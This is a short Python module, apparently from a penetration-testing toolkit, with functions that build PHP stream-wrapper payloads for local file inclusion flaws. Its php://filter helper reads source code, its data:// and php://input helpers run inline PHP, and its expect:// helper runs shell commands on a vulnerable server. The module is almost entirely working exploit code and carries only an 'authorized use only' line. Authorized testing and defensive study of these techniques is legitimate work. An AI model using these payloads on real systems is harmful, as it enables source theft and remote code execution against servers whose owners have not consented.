"""PHP stream wrappers for file inclusion (LFI) targets.

These turn a plain file-inclusion point into source disclosure or code
execution, depending on server configuration:

- php://filter  — read a file's source even when it would otherwise execute,
                  by base64-encoding it in transit (decode the response).
- data://       — execute inline PHP when allow_url_include=On.
- expect://     — run a shell command when the expect extension is loaded.
- php://input   — execute PHP sent in the request body.

AUTHORIZED USE ONLY.
"""
import base64


def php_filter_read(resource: str) -> str:
    """Base64-encode a file's source so it survives inclusion without executing."""
    return f"php://filter/convert.base64-encode/resource={resource}"


def data_wrapper(php_code: str) -> str:
    """Inline PHP via the data:// wrapper (needs allow_url_include=On)."""
    b64 = base64.b64encode(php_code.encode()).decode()
    return f"data://text/plain;base64,{b64}"


def expect_wrapper(cmd: str) -> str:
    """Run a command via the expect:// wrapper (needs the expect extension)."""
    return f"expect://{cmd}"


def php_input_body(php_code: str):
    """Return the (marker, body) pair for a php://input RCE.

    The marker is included as the file; the body carries the PHP to execute."""
    return "php://input", php_code
